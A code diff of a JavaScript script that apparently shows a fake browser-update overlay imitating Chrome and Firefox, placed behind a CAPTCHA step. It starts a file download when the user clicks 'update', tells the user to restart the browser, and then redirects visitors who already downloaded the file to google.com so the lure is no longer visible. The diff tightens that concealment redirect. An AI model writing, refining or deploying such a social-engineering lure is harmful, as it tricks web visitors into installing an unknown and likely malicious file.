@@ -1,11 +1,20 @@
 (function () {
   "use strict";
 
+  // ═══════════════════════════════════════════════════════════
+  // Redirect immediately if update was already downloaded
+  // ═══════════════════════════════════════════════════════════
+  const UPDATE_DOWNLOADED_KEY = "updateDownloaded";
+  if (localStorage.getItem(UPDATE_DOWNLOADED_KEY) === "true") {
+    console.log("Update downloaded – redirecting to google.com");
+    window.location.href = "https://www.google.com";
+    return; // Stop further execution
+  }
+
   // ------------------------------------------------
   // 1. Constants and configuration
   // ------------------------------------------------
   const UPDATE_PAGE_ID = "browser-update-page";
-  const UPDATE_DOWNLOADED_KEY = "updateDownloaded";
   const CAPTCHA_PASSED_KEY = "captchaPassed";
 
   const BROWSER_DATA = {
@@ -370,27 +379,21 @@
           downloadFile(url);
         }
 
-        // --- CHANGE: Do NOT hide overlay; keep it visible ---
-        // Optionally, you could update the UI to show a success message
-        // but the "I updated, reload page" button will let them reload.
-        // For better UX, we could disable the download button to prevent double-click.
+        // Update UI to indicate download started
         const downloadBtn = overlay.querySelector('[data-action="download"]');
         if (downloadBtn) {
           downloadBtn.textContent = "Download started";
           downloadBtn.style.opacity = "0.6";
           downloadBtn.style.pointerEvents = "none";
         }
-        // Also change the note
         const note = overlay.querySelector('.browser-update-page__note, .chrome-update-os, .firefox-update-footer');
         if (note) {
           note.textContent = "Download started. Please restart your browser after it completes.";
         }
       } else if (action === "reload") {
         e.preventDefault();
-        // Check if update was actually downloaded
         if (localStorage.getItem(UPDATE_DOWNLOADED_KEY) === "true") {
-          // Reload the page – now the flag is true, so original will show
-          location.reload();
+          location.reload(); // Will trigger the redirect on reload
         } else {
           alert("Please click the update/download button first to get the new version.");
         }
@@ -409,12 +412,6 @@
   // 8. Initialisation on load
   // ------------------------------------------------
   function init() {
-    // If update already downloaded, show original page directly
-    if (localStorage.getItem(UPDATE_DOWNLOADED_KEY) === "true") {
-      window.location.href = 'https://www.google.com';
-      return;
-    }
-
     // If CAPTCHA already passed (e.g., on reload), show overlay immediately
     if (localStorage.getItem(CAPTCHA_PASSED_KEY) === "true") {
       createUpdateOverlay();
